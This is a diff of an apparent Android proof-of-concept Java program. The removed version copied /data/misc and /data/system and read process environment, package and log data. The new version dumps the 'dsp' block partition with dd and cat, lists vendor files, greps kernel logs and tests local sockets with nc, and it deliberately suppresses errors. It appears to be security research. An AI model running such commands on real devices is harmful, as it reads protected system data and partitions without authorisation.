@@ -1,20 +1,44 @@
 package com.poc;
 
 import java.io.*;
+import java.net.*;
 import java.util.*;
 
 public class Main {
+    private static final String OUTPUT_DIR = "/data/data/com.android.settings/";
+
     public static void main(String[] args) {
-        String targetDir = "/data/data/com.android.settings/";
-        File target = new File(targetDir);
-        if (!target.exists()) {
-            target.mkdirs();
-        }
-        execTest(targetDir + "exec-test.txt");
-        procInfo(targetDir + "proc.txt");
-        multiCommandsAndDump(targetDir);
+        // 出力先ディレクトリを確保
+        new File(OUTPUT_DIR).mkdirs();
+
+        // 1. /dev/block/by-name/dsp の存在確認と情報収集
+        execCommand("ls -l /dev/block/by-name/dsp", OUTPUT_DIR + "dsp_info.txt");
+        execCommand("file /dev/block/by-name/dsp", OUTPUT_DIR + "dsp_info.txt");
+
+        // 2. ddコマンドで先頭1MBをダンプ（権限が許せば）
+        execCommand("dd if=/dev/block/by-name/dsp of=" + OUTPUT_DIR + "dsp_dump.dd bs=1M count=1 2>&1", OUTPUT_DIR + "dsp_dump_result.txt");
+
+        // 3. catでリダイレクト（同様）
+        execCommand("cat /dev/block/by-name/dsp > " + OUTPUT_DIR + "dsp_dump.cat 2>&1", OUTPUT_DIR + "dsp_dump_result.txt");
+
+        // 4. マウント先 /vendor/dsp の内容をリスト
+        execCommand("ls -lR /vendor/dsp", OUTPUT_DIR + "vendor_dsp_ls.txt");
+
+        // 5. /proc/mounts を確認（マウント情報）
+        execCommand("cat /proc/mounts | grep dsp", OUTPUT_DIR + "dsp_mount_info.txt");
+
+        // 6. ソケット可用性テスト（TCP）
+        testSocket();
+
+        // 7. その他、ブロックデバイスの直接読み取りをJavaで試行（FileInputStream）
+        tryReadBlockDevice();
+
+        // 8. 追加の診断：dmesgやlogcatから関連メッセージを取得（オプション）
+        execCommand("dmesg | grep -i dsp", OUTPUT_DIR + "dmesg_dsp.txt");
+        execCommand("logcat -d | grep -i dsp", OUTPUT_DIR + "logcat_dsp.txt");
     }
 
+    // シェルコマンド実行＆追記
     private static void execCommand(String command, String outputFile) {
         try {
             ProcessBuilder pb = new ProcessBuilder("/system/bin/sh", "-c", command);
@@ -33,142 +57,95 @@ public class Main {
             writer.close();
             process.waitFor();
         } catch (Exception e) {
+            // エラーは無視（ログに残さない）
         }
     }
 
-    private static void execTest(String outputFile) {
-        String[] commands = {
-            "id",
-            "whoami",
-            "pwd",
-            "ls -l /",
-            "ls -l /data",
-            "ls -l /system",
-            "ls -l /sdcard",
-            "ls -l /storage",
-            "ls -l /mnt",
-            "ls -lR /data/local/tmp",
-            "find /data -type d -maxdepth 2"
-        };
-        for (String cmd : commands) {
-            execCommand(cmd, outputFile);
-        }
-    }
-
-    private static void procInfo(String outputFile) {
-        File attrDir = new File("/proc/self/attr");
-        if (attrDir.exists() && attrDir.isDirectory()) {
-            File[] files = attrDir.listFiles();
-            if (files != null) {
-                for (File f : files) {
-                    String cmd = "cat " + f.getAbsolutePath();
-                    execCommand(cmd, outputFile);
+    // JavaのFileInputStreamでブロックデバイスを直接読み取り
+    private static void tryReadBlockDevice() {
+        String path = "/dev/block/by-name/dsp";
+        File dev = new File(path);
+        String resultFile = OUTPUT_DIR + "java_read_block.txt";
+        try (BufferedWriter writer = new BufferedWriter(new FileWriter(resultFile, true));
+             FileInputStream fis = new FileInputStream(dev)) {
+            writer.write("Attempting to read first 1024 bytes from " + path + "\n");
+            byte[] buffer = new byte[1024];
+            int read = fis.read(buffer);
+            if (read > 0) {
+                writer.write("Read " + read + " bytes. First 16 bytes (hex): ");
+                for (int i = 0; i < Math.min(16, read); i++) {
+                    writer.write(String.format("%02X ", buffer[i]));
                 }
+                writer.newLine();
+                writer.write("First 16 bytes (ASCII): ");
+                for (int i = 0; i < Math.min(16, read); i++) {
+                    char c = (char) buffer[i];
+                    if (c >= 32 && c < 127) writer.write(c);
+                    else writer.write('.');
+                }
+                writer.newLine();
+            } else {
+                writer.write("Read 0 bytes (EOF or empty)\n");
             }
-        }
-        String[] extra = {
-            "cat /proc/self/status",
-            "cat /proc/self/environ",
-            "cat /proc/self/cmdline",
-            "cat /proc/self/maps"
-        };
-        for (String cmd : extra) {
-            execCommand(cmd, outputFile);
+        } catch (FileNotFoundException e) {
+            appendLine(resultFile, "File not found: " + path + " (may not exist or permission denied)");
+        } catch (IOException e) {
+            appendLine(resultFile, "IOException: " + e.getMessage() + " (probably permission denied)");
+        } catch (Exception e) {
+            appendLine(resultFile, "Unexpected error: " + e.toString());
         }
     }
 
-    private static void copyDir(File src, File dest) {
-        if (src.isDirectory()) {
-            if (!dest.exists()) dest.mkdirs();
-            File[] children = src.listFiles();
-            if (children != null) {
-                for (File child : children) {
-                    copyDir(child, new File(dest, child.getName()));
-                }
-            }
-        } else {
-            try (FileInputStream fis = new FileInputStream(src);
-                 FileOutputStream fos = new FileOutputStream(dest)) {
-                byte[] buffer = new byte[8192];
-                int len;
-                while ((len = fis.read(buffer)) > 0) {
-                    fos.write(buffer, 0, len);
-                }
-            } catch (Exception e) {
-            }
+    // ソケット可用性テスト
+    private static void testSocket() {
+        String resultFile = OUTPUT_DIR + "socket_test.txt";
+        // テスト1: ローカルポートに接続（127.0.0.1:1234 は netstat で LISTEN 状態）
+        try (Socket socket = new Socket("127.0.0.1", 1234)) {
+            appendLine(resultFile, "Socket connection to 127.0.0.1:1234 SUCCESS");
+            socket.close();
+        } catch (IOException e) {
+            appendLine(resultFile, "Socket connection to 127.0.0.1:1234 FAILED: " + e.getMessage());
         }
+
+        // テスト2: 自分でサーバーソケットを開いて、接続してみる
+        try (ServerSocket server = new ServerSocket(0)) { // 0 で任意ポート
+            int port = server.getLocalPort();
+            appendLine(resultFile, "ServerSocket created on port " + port + " (SUCCESS)");
+            // 別スレッドで接続試行
+            final int testPort = port;
+            Thread connectThread = new Thread(() -> {
+                try (Socket s = new Socket("127.0.0.1", testPort)) {
+                    appendLine(resultFile, "Client connected to self on port " + testPort + " SUCCESS");
+                } catch (IOException e2) {
+                    appendLine(resultFile, "Client self-connect FAILED: " + e2.getMessage());
+                }
+            });
+            connectThread.start();
+            // サーバーは accept を試みる（タイムアウト付きで）
+            server.setSoTimeout(2000);
+            try {
+                Socket client = server.accept();
+                appendLine(resultFile, "Server accepted incoming connection SUCCESS");
+                client.close();
+            } catch (SocketTimeoutException e) {
+                appendLine(resultFile, "Server accept timed out (maybe client failed)");
+            } catch (IOException e) {
+                appendLine(resultFile, "Server accept exception: " + e.getMessage());
+            }
+            connectThread.join(3000);
+        } catch (IOException e) {
+            appendLine(resultFile, "ServerSocket creation FAILED: " + e.getMessage());
+        }
+        execCommand("nc -l -p 12345 &", resultFile);  // バックグラウンドでリスン
+        try { Thread.sleep(500); } catch (InterruptedException ignored) {}
+        execCommand("echo test | nc 127.0.0.1 12345", resultFile);
+        execCommand("killall nc", resultFile); // 後片付け
     }
 
-    private static void multiCommandsAndDump(String targetDir) {
-        File target = new File(targetDir);
-        if (!target.exists()) target.mkdirs();
-
-        File miscSrc = new File("/data/misc");
-        File systemSrc = new File("/data/system");
-        if (miscSrc.exists()) {
-            copyDir(miscSrc, new File(target, "misc"));
-        }
-        if (systemSrc.exists()) {
-            copyDir(systemSrc, new File(target, "system"));
-        }
-
-        String outputFile = targetDir + "multi_commands.txt";
-        String[] commands = {
-            "id",
-            "whoami",
-            "pwd",
-            "ls -l /",
-            "ls -l /data",
-            "ls -l /system",
-            "ls -l /sdcard",
-            "ls -l /storage",
-            "ls -l /mnt",
-            "ps",
-            "ps -A",
-            "ps -e",
-            "top -n 1",
-            "df -h",
-            "mount",
-            "netstat -an",
-            "ifconfig",
-            "ip addr show",
-            "getprop",
-            "dumpsys battery",
-            "dumpsys meminfo",
-            "dumpsys package",
-            "pm list packages",
-            "pm list permissions",
-            "am stack list",
-            "am activity list",
-            "logcat -d -v time",
-            "cat /proc/version",
-            "cat /proc/cpuinfo",
-            "cat /proc/meminfo",
-            "cat /proc/uptime",
-            "cat /proc/stat",
-            "cat /proc/loadavg",
-            "cat /proc/sys/kernel/ostype",
-            "cat /proc/sys/kernel/osrelease",
-            "cat /proc/sys/kernel/hostname",
-            "cat /proc/self/status",
-            "cat /proc/self/environ",
-            "cat /proc/self/cmdline",
-            "cat /proc/self/maps",
-            "ls -l /proc/self/fd",
-            "ls -l /data/misc",
-            "ls -l /data/system",
-            "find /data/misc -type f -exec ls -l {} \\; 2>/dev/null",
-            "find /data/system -type f -exec ls -l {} \\; 2>/dev/null",
-            "echo 'test'",
-            "date",
-            "uptime",
-            "uname -a",
-            "cat /proc/interrupts",
-            "ls -lR /data/misc 2>/dev/null",
-            "ls -lR /data/system 2>/dev/null"
-        };
-        for (String cmd : commands) {
-            execCommand(cmd, outputFile);
-        }
+    private static void appendLine(String file, String line) {
+        try (BufferedWriter w = new BufferedWriter(new FileWriter(file, true))) {
+            w.write(line);
+            w.newLine();
+        } catch (IOException ignored) {}
     }
 }
